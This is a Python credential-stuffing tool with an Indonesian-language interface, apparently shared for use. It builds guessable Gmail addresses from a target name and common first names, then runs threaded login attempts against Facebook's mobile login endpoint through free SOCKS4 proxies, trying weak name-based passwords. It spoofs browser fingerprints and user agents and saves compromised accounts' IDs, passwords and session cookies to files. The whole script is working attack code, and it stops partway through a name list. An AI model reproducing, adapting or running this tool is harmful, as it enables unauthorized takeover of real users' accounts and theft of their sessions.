import os
import re
import sys
import json
import rich
import time
import random
import datetime
import requests

from concurrent.futures import ThreadPoolExecutor as Trd
from time import sleep, strftime
from rich.console import Console
from rich.columns import Columns
from rich import print as Cetak
from rich.tree import Tree
from rich.panel import Panel
from random import choice as rc
from random import randint as rr
from random import randrange as rg
from rich.progress import Progress
from rich.progress import SpinnerColumn
from rich.progress import TextColumn
from rich.progress import BarColumn
from rich.progress import TimeElapsedColumn

loop,ok,cp=0,0,0
id, id2 = [], []
idf=[]
(
	ok,
	cp,
	loop,
	id,
	id2,
	idf,
	pwp,
	pwt,
)   =   (
	0,
	0,
	0,
	[],
	[],
	[],
	[],
	[]
	)
(
	P,
	M,
	K,
	B,
	H,
	N
)   =   (
	'\x1b[1;97m',
	'\x1b[1;91m',
	'\x1b[1;93m',
	'\x1b[1;94m',
	'\x1b[1;92m',
	'\x1b[0m'
	)
sys.stdout.write(
	'\x1b]2; BF Clone Email Free By Niaw.MXV\x07'
	)
now = datetime.datetime.now(
	)
if    3 <= now.hour < 12: 
	sapa = "Pagi"
elif 12 <= now.hour < 15: 
	sapa = "Siang"
elif 15 <= now.hour < 18: 
	sapa = "Sore"
else:
	sapa = "Malam"
dta = {
	'1':'Jan',
	'2':'Feb',
	'3':'Mar',
	'4':'Apr',
	'5':'Mei',
	'6':'Jun',
	'7':'Jul',
	'8':'Agu',
	'9':'Sepr',
	'10':'Okt',
	'11':'Nov',
	'12':'Des'
	}
dtb = {
	'1':'Januari',
	'2':'Februari',
	'3':'Maret',
	'4':'April',
	'5':'Mei',
	'6':'Juni',
	'7':'Juli',
	'8':'Agustus',
	'9':'September',
	'10':'Oktober',
	'11':'November',
	'12':'Desember'
	}
dth = {
	'Monday':'Senin',
	'Tuesday':'Selasa',
	'Wednesday':'Rabu',
	'Thursday':'Kamis',
	'Friday':'Jumat',
	'Saturday':'Sabtu',
	'Sunday':'Minggu'
	}
tgl = now.day
mon = dta[
	(
		str(
			now.month
		)
	)
]
bln = dtb[
	(
		str(
			now.month
		)
	)
]
thn = now.year
day = dth[
	(
		str(
			strftime(
				"%A"
			)
		)
	)
]
jam = now.strftime(
	"%I"
	)
mnt = now.strftime(
	"%M"
	)
dtk = now.strftime(
	"%S"
	)
wkt = (
		'%s,%s-%s-%s,%s:%s:%s,%s'
		%
		(
		day,
		tgl,
		bln,
		thn,
		jam,
		mnt,
		dtk,
		sapa
		)
	)
okc = (
	'OK-'
	+
	str(tgl)
	+
	'-'
	+
	str(mon)
	+
	'-'
	+
	str(thn)
	+
	'.txt'
	)
cpc = (
	'CP-'
	+
	str(tgl)
	+
	'-'
	+
	str(mon)
	+
	'-'
	+
	str(thn)
	+
	'.txt'
	)
try:
	prox = requests.get(
		'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all'
	).text 
	open(
		'p.txt','w'
	).write(
		prox
	)
except Exception as e:
	Console(width=48).print(
		Panel(
			"[bold purple]* [bold #FF00D4]error 404, jaringan lemot![bold purple] *",
			width=48,
			style=f"bold purple",
			),
		justify="center",
		)
	exit(
	)
def Bersih():
	os.system(
		"cls"
		if os.name == "nt"
		else "clear"
	)
def Back_Menu():
	Main_Menu(
	)
def Banner():
	Console(width=48).print(
		Panel(
			'''[bold #FF00D4] ⠀⠀⠀⠀⠀⠀⢁⣴⣶⣶⣤⣀⠀⠀⠀⠉⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠒⣠⣶⣶⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⢀⡜⣽⣃⣿⣿⣿⣿⣿⣦⡀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⠈⢻⣦⠀⠠⡀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⣰⠋⣰⠇⣸⡟⠙⢻⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⠀⢀⣿⣷⡀⠘⢆⠀⠀⠀⠀\n⠀ ⠀⣰⠃⣴⡏⢀⣿⠁⠀⠀⠙⢿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡿⠋⢸⡇⠀⣿⣿⣷⡀⠀⠳⡀⠀⠀\n ⠀⢠⠏⣴⡿⠀⣾⡏⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣷⣤⣤⣤⣤⣾⣿⣿⣿⠋⠀⠀⠈⣇⠀⠘⣿⣿⣷⡀⠀⠹⡄⠀\n ⠀⣿⠏⢸⣗⣼⡿⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣻⣷⣄⠀⠀⠀⢹⡀⠀⠻⣿⣿⣷⡀⠀⠸⡀\n ⢸⠇⣶⣾⣿⣿⠃⠀⠀⠀⠀⠀⣤⣼⣟⢋⡬⣽⡟⣟⡛⢿⢿⡛⠻⡿⠿⣿⣦⠀⠀⠈⣧⠀⠀⢻⣿⣿⣿⡄⠀⢇\n ⣿⣶⣾⣿⣿⠃⠀⠀⠀⠀⢀⣞⡟⣯⣴⣾⣿⠃⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠸⣇⠀⢉⣽⣿⣿⣿⡄⠈\n ⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⡼⣞⣾⢿⣿⣿⡏⠀⣿⣿⡏⣿⣿⢻⣿⣿⣿⣿⣿⣿⡇⠀⢀⡙⣆⠀⠠⣾⣿⣿⣷⠀\n ⠹⠿⠿⠋⠀⠀⠀⠀⠀⢰⡿⣹⡏⡿⣽⡿⠀⠀⠈⣟⣯⢿⣿⠀⠛⠿⣿⣿⣿⣿⣿⡀⠀⠀⠘⢷⣄⣨⣿⣿⠟⠀\n ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠃⣿⣿⣇⣿⣡⣴⣶⠐⠭⣿⡇⡟⣿⣿⠟⢾⡏⢿⣿⣿⣿⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀\n ⠂⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⡿⣿⣿⣿⠁⠛⠛⠀⠟⠿⣹⠁⠀⠁⢠⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⣿⣿⣿⣏⠀⠀⠀⠀⠀⠇⠀⠀⠀⣣⢿⣯⢾⣿⡿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢠⢿⣿⣿⣾⡀⠀⠀⠈⠉⠀⠀⠀⠀⣠⡿⣿⣾⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣾⠘⣿⣿⣿⣦⣄⣀⠀⠀⣀⡴⠞⣿⣁⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣬⣿⣿⣿⣿⣿⣿⡛⠋⠁⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⣿⣿⣿⠿⢿⢿⢻⣅⠈⠳⠤⣀⡀⠾⣿⡛⣿⣟⡿⠿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣇⡟⠉⠀⠀⠈⢿⣾⣧⣷⡀⢰⣾⣽⣷⣿⣿⠟⣿⡏⠁⠈⢻⣷⢣⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣯⣿⠁⠀⠀⠀⠀⠈⢹⡿⣏⡌⠄⢻⡏⠀⠏⠋⠀⠞⣫⡃⠀⠈⣿⣯⢇⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⠀⠀⠀⠀⠀⢠⡀⢊⡾⠆⠄⠂⠀⠀⠀⠀⠀⠀⡳⡡⢧⡀⣿⣿⣾⡄⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⣰⡿⣿⣿⠀⠀⠀⠀⠀⢰⠁⠀⢺⣲⡓⡀ ⠀⠀⢄⠀⠀⠕⣖⡇⢈⣼⣿⡜⣷⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⣿⡇⣿⣿⡀⠀⠀⠀⠀⠘⠀⢀⡼⣿⡿⢭⡂⠀⠀ ⠳⡀⠁⣸⣿⣋⠈⣿⣿⠹⡇⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⢸⡿⣿⣿⠻⡇⠀⠀⠀⠀⠀⠀⣼⠀⢛⣧⠅⡏⠳⣦ ⡀⢃⣰⣟⠻⡆⠀⣼⣿⣧⣷⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⢸⠃⢻⡏⢸⣷⠀⠀⠀⠀⠀⣸⡇⠀⠀⠻⢿⡅⠀⣶⣿⣶⣴⣿⣤⣽⣾⣾⣿⣿⡟⣿⡀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠘⡆⠸⣧⣼⢹⡆⠀⠀⠀⠀⣿⣿⣦⣤⣸⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢹⡇⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠰⠃⠀⢻⡏⣼⣷⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⡇⠘⡇⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠂⠀⠀⢰⣿⣿⣿⣇⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢠⡿⣧⣿⣹⡇⠀⡇⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⣰⣯⡾⢣⣿⣿⡀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢸⡇⣿⠇⣿⠁⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⢀⣠⠾⠛⠁⢠⡿⡿⣿⠇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠈⡇⠋⠀⡯⣀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠈⡆⠀⠀⠔⠋⣼⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⡇⠀⠀⠀⠀⠁⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠁⢀⣠⡴⣻⣿⣿⣿⡆⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⡿⠁⡇⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⣠⠖⠋⠉⠉⠙⢿⣿⣿⡇⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡿⠁⠀⢰⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⡤⠊⠀⠀⠀⠠⠀ ⠀⠈⢻⣿⣿⠀⠀⠀⠸⣿⣿⣿⣿⣟⣾⠷⣄⠀⢸⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀\n ⠀⡠⠊⡀⠀⠀⠠⠈⠀⠀ ⠀⠀⠈⣿⣿⡆⠀⠀⠀⣿⣿⣿⣿⠟⠁⠀⠙⡆⠀⡇⠀⠠⠁⠀         \n[bold purple]╭──────────────────────────────────────────╮\n│[bold #FF00D4] Tool Crack From Clone @Gmail by Niaw.MXV [bold purple]│\n╰──────────────────────────────────────────╯''',
			width=48,
			title="[bold #545B5B][ [bold #FF0000]● [bold #FFFF00]● [bold #00FF00]●[bold #545B5B] ]",
			title_align="left",
			subtitle=f"[bold #FF00D4]* <[bold purple][underline]{wkt}[bold #FF00D4][/underline]> *",
			style=f"bold purple",
		)
	)
def Main_Menu():
	Bersih(
		)
	Banner(
	)
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]input menu (1/2)",
			style="bold purple",
			),
		justify="center"
	)
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]1.dump clone email    2.cek hasil ok cp",
			width=48,
			subtitle="╭──",
			subtitle_align="left",
			style="bold purple",
			),
		justify="center"
	)
	Pilih = Console().input(
		"[bold purple]   ╰─> "
	)
	if Pilih in ("1"):
		Nama_Target(
		)
	if Pilih in ("2"):
		Hasil_OkCp(
		)
	else:
		Console(width=48).print(
			Panel(
				"[bold #FF00D4]macam tak betul budek ni",
				width=48,
				style="bold purple",
				),
			justify="center"
		); exit(
	)
def Nama_Target():
	Console(width=48,style="bold purple").print(
		Panel(
			"[bold #FF00D4]input nama target",
			width=48,
			subtitle="╭──",
			subtitle_align="left",
			),
		justify="center"
	)
	nama = Console().input(
			"[bold purple]   ╰─> "
		)
	if len(nama) > 3:
		Dump_Email(
			nama
		) # Pswrd()
	elif ',' in str(nama):
		Console(width=48).print(
			Panel(
				"[bold #FF00D4]masukan 1 nama saja",
				width=48,
				style="bold purple",
				),
			justify="center"
		)
		exit()
	else:
		Console(width=48).print(
			Panel(
				"[bold #FF00D4]nama harus di atas 3 huruf",
				width=48,
				style="bold purple",
				),
			justify="center"
		)
	exit(
	)
def Dump_Email(nama):
	CC = 0; Console(width=48).print(
			Panel(
				"[bold #FF00D4]input total clone",
				width=48,
				subtitle="╭──",
				subtitle_align="left",
				style="bold purple",
				),
			justify="center"
		)
	jumlah = Console().input("[bold purple]   ╰─> ")
	domain = '@gmail.com'
	for xyz in range(int(jumlah)):
		AA = nama
		BB = Inisial()
		CC+=1
		cc = str(rr(0,999))
		DD = domain
		EE = rc(
			[
				f'{AA}{rc(["",".",""])}{BB}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',
				f'{BB}{rc(["",".",""])}{AA}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',
				f'{AA}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',
				f'{AA}{rc(["",".",""])}{BB}{DD}',
				f'{BB}{rc(["",".",""])}{AA}{DD}'
			]
		)
		FF = f'{EE}|{nama}'
		if FF in id:
			pass
		else:
			id.append(FF)
		print(
			f"       ╰─> sedang mengclone {len(id)} email     ",
			end="\r"
		)
		sleep(0.0007)
	Psswrd(
	)
def Psswrd():
	global prog,des
	Console(width=48).print(
		Panel(
			f"[bold #FF00D4]terkumpul {len(id)} email",
			style="bold purple",
			),
		justify="center"
	)
	for xnx in id:
		id2.append(
			xnx
		)
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]tambah kata sandi (y/t)",
			width=48,
			subtitle="╭──",
			subtitle_align="left",
			style="bold purple",
			),
		justify="center"
	)
	pwa = Console().input(
		"[bold purple]   ╰─> "
	)
	if pwa in ["y", "Y"]:
		pwp.append(
			"bade"
		)
		Console(width=48).print(
			Panel(
				"[bold #FF00D4]example: password,facebook,rahasia",
				width=48,
				subtitle="╭──",
				subtitle_align="left",
				style="bold purple",
				),
			justify="center"
		)
		pwn = Console().input(
			"[bold purple]   ╰─> "
		)
		pwk = pwn.split(
			","
		)
		for xpw in pwk:
			pwt.append(
				xpw
			)
	else:
		pwp.append(
			"moal"
		)
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]mode pesawat per 300 clone email",
			width=48,
			subtitle="[bold #FF00D4]* <[bold purple][underline]hasil akun ok dan cp tersimpan di[/underline][bold #FF00D4]> *",
			style="bold purple",
			),
		justify="center"
	)
	Colom2 = [
]
	Colom2.append(
		Panel(
			f"[bold #00FF00] {okc}",
			width=23,
			style="bold purple",
		)
	)
	Colom2.append(
		Panel(
			f"[bold #FFFF00] {cpc}",
			width=24,
			style="bold purple",
		)
	)
	Console(width=48).print(
		Columns(
			Colom2
			),
		justify="center"
	)
	prog = Progress(
		SpinnerColumn(
			'clock'
		),
		TextColumn(
			'{task.description}'
		),
		BarColumn(
		),
		TextColumn(
			'{task.percentage:.0f}%'
		),
		TimeElapsedColumn(
		)
	);des = prog.add_task(
			'',
			total = len(
				id2
			)
		)
	with prog:
		with Trd(max_workers=30) as MethodCrack:
			for uids in id2:
				user = uids.split('|')[0]
				nmfl = uids.split('|')[1].lower()
				nama = nmfl.split(' ')[0]
				pasw = [
					'kamunanya',
					'kamu nanya',
					'kata sandi',
					nama+' '+nama,
					nama+nama,
					nama,
					nama+'12',
					nama+'123',
					nama+'1234',
					nama+'12345',
					nama+'123456'
				]
				if 'bade' in pwp:
					for xpwd in pwt:
						pasw.append(
							xpwd
						)
				else:
					pass
				MethodCrack.submit(
					Async,
					user,
					pasw
				)
		print()
	Console(width=48).print(
		Panel(
			f'[bold #FF00D4]crack selesai total live: [bold #00FF00]{ok} [bold #FF00D4]total check: [bold #FFFF00]{cp}',
			width=48,
			style=f"bold purple"
			),
		justify="center"
	)
def Konversi(cookie):
	kueh = (
		'datr=%s;sb=%s;ps_l=0;ps_n=0;c_user=%s;xs=%s;fr=%s'
		%
		(
			cookie[
				'datr'
			],
			cookie[
				'sb'
			],
			cookie[
				'c_user'
			],
			cookie[
				'xs'
			],
			cookie[
				'fr'
			]
		)
	)
	return(
		str(
			kueh
		)
	)
def Async(user,pasw):
	global loop,ok,cp
	prog.update(des,description=f"[bold purple]async [bold #FF00D4]{loop}[bold white] = [bold #FF00D4]{len(id)} [bold #80FF00]{ok}[bold white] = [bold #FF0000]{cp}[/]")
	prog.advance(des)
	for pw in pasw:
		try:
			ses = requests.Session(); ua = UaRlmi() # rc([UaItil(),UaRlmi()])
			xxx = open('p.txt','r').read().splitlines()
			zzz = {'http': 'socks4://'+random.choice(xxx)}
			url = (f'{rc(["m.alpha", "p"])}.facebook.com')
			link = ses.get("https://"+url+"/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
			date = {
				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
				"li": re.search('name="li" value="(.*?)"', str(link)).group(1),
				"try_number": 0,
				"unrecognized_tries": 0,
				"email": user,
				"prefill_contact_point": user,
				"prefill_source": "browser_dropdown",
				"prefill_type": "contact_point",
				"first_prefill_source": "browser_dropdown",
				"first_prefill_type": "contact_point",
				"had_cp_prefilled": True,
				"had_password_prefilled": False,
				"is_smart_lock": False,
				"bi_xrwh": 0,
				"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
				"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
				"jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
				"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)
				}
			head = {
				"Host": url,
				"content-length": str(len((date))),
				"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
				"sec-ch-ua-mobile": "?1",
				"user-agent": ua,
				"x-response-format": "JSONStream",
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
				"viewport-width": "360",
				"x-requested-with": "XMLHttpRequest",
				"x-asbd-id": "129477",
				"dpr": "2",
				"sec-ch-prefers-color-scheme": "light",
				"sec-ch-ua-platform": '"Android"',
				"accept": "*/*",
				"origin": "https://"+url,
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"referer": "https://"+url+"/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}
			sign = ses.post("https://"+url+"/login/device-based/login/async/?refsrc=deprecated&lwv=100",
				data = date,
				headers = head,
				allow_redirects = False,
				proxies = zzz
				)
			if "checkpoint" in ses.cookies.get_dict():
				try:
					uid = ses.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				except: 
					uid = user
				if uid in idf:
					break
				idf.append(
					uid
				)
				tree = Tree(
					"",
					guide_style="bold purple"
				)
				true = tree.add(
					Panel(
						"[bold #FFFF00]login akun facebook cekpoint",
						subtitle="* ᴅᴀᴛᴀ *",
						subtitle_align="left",
						width=32,
						style="bold purple"
					)
				).add(
					f"[bold #FFFF00]ᴜʀʟᴡᴇʙ: [#FFFFFF]{url}"
					,style="bold purple"
				)
				true.add(
					f"[bold #FFFF00]@ɢ: [#FFFFFF]{user}",
					style="bold purple"
				)
				true.add(
					f"[bold #FFFF00]ɪᴅ: [#FFFFFF]{uid}",
					style="bold purple"
				)
				true.add(
					f"[bold #FFFF00]ᴘᴡ: [#FFFFFF]{pw}",
					style="bold purple"
				)
				true = tree.add(
					Panel(
						f"[bold #FF00D4]{ua}",
						title="* ᴜɢᴇɴ *",
						title_align="left",
						width=84,style="bold purple"
					)
				)
				true.add(
					Panel(
						"[bold #FFFF00]silahkan check di lite/mbasic barangkali opsi checkpointnya dapat dibuka!",
						title="* ɪɴғᴏ *",
						title_align="left",
						width=80,
						style="bold purple"
					)
				)
				Cetak(
					tree
				)
				open(
					'CP/'
					+
					cpc,
					'a'
					).write(
					uid
					+
					'|'
					+
					pw
					+
					'\n'
				)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict():
				kuki = Konversi(
					ses.cookies.get_dict()
				)
				uid = re.findall(
					'c_user=(.*);xs',
					kuki
				)[0]
				if uid in idf or user in idf:
					break
				idf.append(
					uid
				)
				tree = Tree(
					"",
					guide_style="bold purple"
				)
				true = tree.add(
					Panel(
						"[bold #00FF00]login akun facebook berhasil",
						subtitle="* ᴅᴀᴛᴀ *",
						subtitle_align="left",
						width=32,
						style="bold purple"
					)
				).add(
					f"[bold #00FF00]ᴜʀʟᴡᴇʙ: [#FFFFFF]{url}"
					,style="bold purple"
				)
				true.add(
					f"[bold #00FF00]@ɢ: [#FFFFFF]{user}",
					style="bold purple"
				)
				true.add(
					f"[bold #00FF00]ɪᴅ: [#FFFFFF]{uid}",
					style="bold purple"
				)
				true.add(
					f"[bold #00FF00]ᴘᴡ: [#FFFFFF]{pw}",
					style="bold purple"
				)
				true = tree.add(
					Panel(
						f"[bold #FF00D4]{ua}",
						title="* ᴜɢᴇɴ *",
						title_align="left",
						width=84,style="bold purple"
					)
				)
				true.add(
					Panel(
						f"[bold #00FF00]{kuki}",
						title="* ᴋᴜᴇʜ *",
						title_align="left",
						width=80,
						style="bold purple"
					)
				)
				Cetak(
					tree
				)
				open(
					'OK/'
					+
					okc,
					'a'
					).write(
					uid
					+
					'|'
					+
					pw
					+
					'|'
					+
					kuki
					+
					'|'
					+
					ua
					+
					'\n'
				)
				ok+=1
				break
			else:
				continue
		except (requests.exceptions.ConnectionError):
			sleep(30)
	loop +=1
def UaRlmi():
	return rc(
		[
			 f"Mozilla/5.0 (Linux; Android 11; itel A512W Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4692.98 Mobile Safari/537.36{rc(['','[FBAN/EMA;FBLC/ar_AR;FBAV/249.0.0.10.119;]',' [FB_IAB/FB4A;FBAV/410.0.0.26.115;]',''])}",
			 f"Mozilla/5.0 (Linux; U; Android 11; itel A512W Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36{rc([' OPR/78.0.2254.70362',' PHX/12.4'])}",
			 f"Mozilla/5.0 (Linux; Android 11; itel A512W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
			 f"Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(99,123))}.0.{str(rr(5000,6399))}.{str(rr(10,299))}{rc([f' Quark/{str(rr(1,6))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(100,999))}',f' UCBrowser/{str(rr(1,19))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(100,1299))}',f' MQQBrowser/{str(rr(4,10))}.{str(rr(0,9))}'])} Mobile Safari/537.36",
			 f"Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(99,123))}.0.{str(rr(5000,6399))}.{str(rr(10,299))} Mobile Safari/537.36{rc([f' RealmeBrowser/{str(rr(10,39))}.{str(rr(1,9))}.0.{str(rr(1,9))},gzip(gfe)',f' RealmeBrowser/{str(rr(10,39))}.{str(rr(1,9))}.0.{str(rr(1,9))}'])}",
			 f"Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(99,123))}.0.{str(rr(5000,6399))}.{str(rr(10,299))} Mobile Safari/537.36 OPR/{str(rr(50,83))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}",
			 f"Mozilla/5.0 (Linux; U; Android 11; en-us; RMX3241 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,123))}.0.{str(rr(5000,6399))}.{str(rr(10,299))} Mobile Safari/537.36 HeyTapBrowser/{str(rr(6,49))}.{str(rr(7,8))}.{str(rr(2,40))}.{str(rr(1,9))}",
			 f"Mozilla/5.0 (Linux; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(99,123))}.0.{str(rr(5000,6399))}.{str(rr(10,299))} Mobile Safari/537.36 GSA/{str(rr(5,14))}.{str(rr(1,50))}.{str(rr(1,40))}.{str(rr(1,30))}.arm64",
			 f"Mozilla/5.0 (Linux; Android 11; RMX3241) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(16,23))}.0 Chrome/{str(rr(99,123))}.0.{str(rr(5000,6399))}.{str(rr(10,299))} Mobile Safari/537.36"
		]
	)
def Inisial():
	return rc(
		[
			'abiyah', 'abdilla', 'aca', 'acha', 'acaa', 'achaa', 'ai', 'aii', 'adawiah', 'adawiyah', 'ade', 'adel', 'adell', 'adel', 'adellaa', 'adelia', 'adellia', 'adeliya', 'adiba', 'adifa', 'adinda', 'aeni', 'aidah', 'aini', 'ainun', 'aira', 'asiah', 'aisah', 'aisyah', 'afifah', 'afipah', 'alawiah', 'alawiyah', 'alfatunisa', 'alfatunnisa', 'agnes', 'agnesia', 'ajahra', 'ajeng', 'ajeung', 'ajig', 'ajijah', 'ajizah', 'ajg', 'alesha', 'alia', 'alika', 'alimah', 'aliya', 'alifa', 'alifah', 'aliva', 'alivah', 'aliyah', 'almeera', 'almira', 'ama', 'amalia', 'amaliag', 'amaliyah', 'amanda', 'amidah', 'amira', 'aminah', 'ana', 'anantasia', 'anantasya', 'anastasia', 'anastasya', 'agnes', 'andini', 'ani', 'anisa', 'anita', 'any', 'anying', 'anyun', 'angela', 'angelina', 'anggraeni', 'anggraini', 'anggi', 'anggita', 'anggun', 'anjas', 'anjasmara', 'anjay', 'anugerah', 'anugrah', 'anjing', 'apifah', 'apipah', 'april', 'aprilia', 'aprillia', 'apriliani', 'apriliyani', 'aprilianti', 'apriliyanti', 'aqila', 'aqilla', 'ara', 'arra', 'arafah', 'arrafah', 'areta', 'aretha', 'arofah', 'arin', 'arini', 'ariani', 'arista', 'ariyani', 'aryani', 'aryanti', 'arianti', 'ariyanti', 'arumi', 'arsita', 'arsyita', 'arsila', 'asyila', 'asypa', 'asifa', 'asipa', 'asmi', 'asmara', 'asih', 'asilah', 'asti', 'astiani', 'astiyani', 'astuti', 'atik', 'atika', 'atikah', 'ayg', 'ayank', 'ayang', 'ayra', 'ayu', 'ayyu', 'ayunda', 'ayuni', 'ayudia', 'ayudiya', 'ayudiah', 'ayuningsih', 'azzahra', 'azijah', 'azizah', 'azmi', 'azmy', 'azura',
			'babi', 'baby', 'badriah', 'bajingan', 'bagong', 'bandung', 'bngst', 'bangsat', 'bela', 'bella', 'bibah', 'bila', 'billa', 'belinda', 'betharia', 'bintang', 'briana', 'britania', 'briela', 'briyana', 'budiarti', 'bulan', 'bunga', 'bungsu', 'bunyamin', 'butet',
